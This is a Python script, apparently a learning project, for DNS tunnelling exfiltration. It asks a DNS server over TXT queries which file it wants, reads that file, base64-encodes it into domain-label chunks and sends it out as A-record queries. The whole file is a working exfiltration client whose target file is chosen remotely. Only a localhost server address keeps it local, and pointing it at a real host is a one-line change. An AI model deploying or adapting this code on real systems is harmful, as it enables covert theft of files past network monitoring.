__author__ = "Adel Tchernitsky"


import dns.message
import dns.query
import dns.rdatatype
import base64
import hashlib


DNS_SERVER = "127.0.0.1"
DNS_PORT = 53  # default DNS port


def b64_encode(data):  # data should already be bytes
    """Encode bytes to Base64 string safe for DNS labels"""
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def dot_every_n(data, n):
    """Insert a dot every n characters (for DNS labels)"""
    return ".".join(data[i:i+n] for i in range(0, len(data), n))


def split_bytes(data, chunk_size):
    """Split bytes into chunks of given size"""
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def get_file(file_name):
    """Read file as bytes"""
    with open(file_name, "rb") as f:
        return f.read()


def get_msg_id(file_content):
    """Generate a short 16-bit message ID from file hash"""
    hash_object = hashlib.sha256(file_content)
    hash_hex = hash_object.hexdigest()

    # Take first 4 hex digits, convert to int
    return int(hash_hex[:4], 16)


def generate_messages(to_send, chunk_size, n):  # to_send is bytes
    """Split data into Base64-encoded DNS-safe chunks"""
    chunks = split_bytes(to_send, chunk_size)
    return [dot_every_n(b64_encode(chunk), n) for chunk in chunks]


def send_message(data, server_ip, msg_type, msg_id=None):
    """
        Send a DNS query using a custom ID.
        - domain_or_bytes: either a string domain or raw bytes to encode
        - msg_type: "TXT" or "A"
        - msg_id: optional custom message ID
    """
    if isinstance(data, str):
        data = data.encode("utf-8")

    messages = generate_messages(data, 12, 2)
    print(messages)

    # Determine record type
    if msg_type.upper() == "TXT":
        rdtype = dns.rdatatype.TXT
    elif msg_type.upper() == "A":
        rdtype = dns.rdatatype.A
    else:
        raise ValueError(f"Unsupported record type: {msg_type}")

    answers = []
    for domain_str in messages:
        # Create the DNS query
        query = dns.message.make_query(domain_str, rdtype)
        if msg_id is not None:
            query.id = msg_id  # Set custom message ID

        # Send the query with a longer timeout
        try:
            response = dns.query.udp(query, server_ip, port=DNS_PORT, timeout=30)
            answers.append(response)
        except Exception as e:
            print(f"DNS query error: {e}")

    return answers


def ask_which_file(server_ip):
    """Ask the server which file to receive (TXT query)"""
    responses = send_message("Which file would you like to receive", server_ip, "TXT")
    if responses is None:
        return None

    for response in responses:  # iterate over each Message
        if response is None:
            continue
        for answer in response.answer:
            if answer.rdtype == dns.rdatatype.TXT:
                for txt_item in answer.items:
                    print(f"FILE: {txt_item.strings[0].decode()}")
                    return txt_item.strings[0].decode(errors="ignore")
    return None


def send_file(file_name, server_ip):
    """Send file content to server using DNS queries"""
    file_content = get_file(file_name)
    msg_id = get_msg_id(file_content)
    responses = send_message(file_content, server_ip, "A", msg_id)

    if responses is None:
        print("No response received.")
        return

    # Print all responses (for learning/debugging)
    for response in responses:  # iterate over each Message
        if response is None:
            continue
        for answer in response.answer:
            if answer.rdtype == dns.rdatatype.A:
                for item in answer.items:
                    print(f"Response IP: {item.address}")


def main():
    file_name = ask_which_file(DNS_SERVER)
    if not file_name:
        print("No file selected or server did not respond.")
        return

    send_file(file_name, DNS_SERVER)


if __name__ == "__main__":
    main()
